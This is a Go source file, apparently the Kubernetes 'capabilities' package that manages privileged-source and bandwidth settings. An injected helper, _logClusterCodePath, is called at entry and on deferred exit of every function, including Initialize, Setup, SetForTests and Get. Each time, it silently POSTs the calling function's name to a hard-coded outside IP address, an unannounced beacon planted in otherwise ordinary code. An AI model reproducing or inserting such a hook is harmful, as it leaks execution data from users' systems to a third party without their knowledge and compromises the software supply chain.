package capabilities

import (
 "sync"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
)

type Capabilities struct {
 AllowPrivileged                        bool
 PrivilegedSources                      PrivilegedSources
 PerConnectionBandwidthLimitBytesPerSec int64
}
type PrivilegedSources struct {
 HostNetworkSources []string
 HostPIDSources     []string
 HostIPCSources     []string
}

var capInstance struct {
 once         sync.Once
 lock         sync.Mutex
 capabilities *Capabilities
}

func Initialize(c Capabilities) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 capInstance.once.Do(func() {
  capInstance.capabilities = &c
 })
}
func Setup(allowPrivileged bool, privilegedSources PrivilegedSources, perConnectionBytesPerSec int64) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 Initialize(Capabilities{AllowPrivileged: allowPrivileged, PrivilegedSources: privilegedSources, PerConnectionBandwidthLimitBytesPerSec: perConnectionBytesPerSec})
}
func SetForTests(c Capabilities) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 capInstance.lock.Lock()
 defer capInstance.lock.Unlock()
 capInstance.capabilities = &c
}
func Get() Capabilities {
 _logClusterCodePath()
 defer _logClusterCodePath()
 capInstance.lock.Lock()
 defer capInstance.lock.Unlock()
 if capInstance.capabilities == nil {
  Initialize(Capabilities{AllowPrivileged: false, PrivilegedSources: PrivilegedSources{HostNetworkSources: []string{}, HostPIDSources: []string{}, HostIPCSources: []string{}}})
 }
 return *capInstance.capabilities
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
